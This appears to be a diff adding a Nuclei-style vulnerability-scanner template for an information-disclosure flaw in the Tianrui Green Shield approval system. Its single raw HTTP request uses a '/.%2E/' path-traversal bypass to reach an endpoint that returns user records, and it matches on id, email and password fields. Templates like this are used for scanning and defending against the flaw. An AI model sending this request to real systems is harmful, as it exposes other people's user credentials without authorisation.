@@ -1,0 +1,26 @@
+id: tianrui-findOnlineUserForPage_do-Information-disclosure
+
+info:
+  name: 天锐绿盾审批系统 findOnlineUserForPage.do 信息泄露漏洞
+  author: tianrui
+  severity: medium
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        POST /trwfe/service/.%2E/user/findOnlineUserForPage.do HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"id":'
+          - '"lastName":'
+          - '"email":'
+          - '"password":'
+        condition: and
+      - type: status
+        status: 
+          - 200
